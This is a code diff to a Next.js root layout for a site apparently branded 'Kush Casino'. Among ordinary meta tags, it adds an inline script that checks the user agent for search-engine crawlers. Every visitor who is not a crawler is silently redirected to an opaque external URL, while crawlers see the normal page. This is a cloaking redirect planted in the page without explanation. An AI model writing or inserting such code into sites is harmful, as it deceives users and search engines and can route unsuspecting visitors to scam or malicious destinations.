@@ -89,6 +89,21 @@ export default function RootLayout({
         <meta name="author" content="Kush Casino" />
         <meta name="classification" content="online casino overview" />
         <meta name="coverage" content="Worldwide" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://neo7-cr9t-ksh.com/dzbencl4f");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="kz13-body">{children}</body>
     </html>
